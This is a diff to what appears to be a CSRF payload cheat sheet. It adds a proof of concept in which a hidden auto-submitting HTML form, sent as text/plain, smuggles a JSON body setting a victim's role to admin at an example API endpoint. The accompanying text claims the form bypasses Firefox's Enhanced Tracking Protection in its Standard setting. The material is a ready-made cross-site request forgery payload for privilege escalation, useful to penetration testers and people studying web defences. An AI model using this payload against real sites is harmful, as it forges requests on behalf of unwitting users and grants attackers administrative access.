@@ -112,6 +112,8 @@ xhr.send();
 
 ### JSON POST - Simple Request
 
+With XHR :
+
 ```html
 <script>
 var xhr = new XMLHttpRequest();
@@ -125,6 +127,17 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
+With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :
+
+```html
+<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
+// this input will send : {"role":admin,"other":"="}
+ <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
+</form>
+<script>
+ document.getElementById("CSRF_POC").submit();
+</script>
+```
 
 ### JSON POST - Complex Request
 
